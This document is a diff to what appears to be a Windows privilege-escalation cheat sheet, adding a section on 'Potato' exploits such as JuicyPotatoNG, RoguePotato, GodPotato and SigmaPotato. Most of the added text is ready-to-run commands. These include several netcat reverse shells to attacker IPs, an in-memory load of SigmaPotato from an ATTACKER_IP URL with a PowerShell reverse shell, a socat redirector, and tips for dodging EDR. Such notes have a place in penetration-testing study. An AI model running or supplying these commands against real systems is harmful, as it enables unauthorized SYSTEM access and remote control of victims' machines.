@@ -149,12 +149,111 @@ $ SharpUp.exe audit TokenPrivileges
 ```powershell
 $ PrintSpoofer64.exe -i -c cmd
 ```
-##
+## Potato Family JuicyPotato
 
+### JuicyPotatoNG
 
+```bash
 
+JuicyPotatoNG.exe -t * -p C:\windows\system32\cmd.exe -a "/c C:\users\kohsuke\desktop\nc.exe -e cmd.exe 10.10.16.48 9002"
+```
 
+### **PrintSpoofer**
 
+```bash
+# can use -i to inject to same process
+PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"
+```
+
+### **RoguePotato**
+
+```bash
+c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
+# In some old versions you need to use the "-f" param
+c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
+
+# If outbound 135 is blocked, pivot the OXID resolver via socat on your redirector:
+# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
+socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
+
+# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
+RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
+
+```
+
+### **SharpEfsPotato**
+
+```bash
+SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
+# we cat the w.log  
+type C:\temp\w.log
+nt authority\system
+```
+
+### **EfsPotato**
+
+```bash
+# output will be nt authority\system
+EfsPotato.exe "whoami"
+
+# If one pipe fails or EDR blocks it, try the other supported pipes:
+EfsPotato <cmd> [pipe]
+	pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
+```
+
+### **GodPotato**
+
+```bash
+# Works across Windows 8/8.1–11 and Server 2012–2022 when SeImpersonatePrivilege is present.
+GodPotato -cmd "cmd /c whoami"
+# You can achieve a reverse shell like this.
+GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
+
+```
+
+### **DCOMPotato**
+
+```bash
+# PrinterNotify variant
+PrinterNotifyPotato.exe "cmd /c whoami"
+
+# McpManagementService variant (Server 2022 also)
+McpManagementPotato.exe "cmd /c whoami"
+
+```
+
+### **SigmaPotato**
+
+```bash
+# Load and execute from memory (no disk touch)
+[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
+[SigmaPotato]::Main("cmd /c whoami")
+
+# Or ask it to spawn a PS reverse shell
+[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
+
+```
+
+### **CLSID Problems**
+
+```bash
+# Oftentimes default CLSID that JuicyPotato uses doesn't work 
+https://ohpe.it/juicy-potato/CLSID/
+```
+
+### **Checking CLSIDs**
+
+```bash
+# Download Join-Object.ps1 and load it
+https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1
+
+# download and execute 
+https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1
+
+# trying every CLSID  when the port number changes, it will mean that the CLSID worked.
+# Check the working CLSIDs using the parameter -c
+https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat
+```
 
 ## Stored Credentials (Runas)
 ### Enumeration
@@ -288,3 +387,4 @@ $ sc start "Vulnerable Service 2"
 ```powershell
 icacls "C:\Program Files\CustomSrv2\Service2.exe" /remove:g BUILTIN\Users:(M)
 ```
+
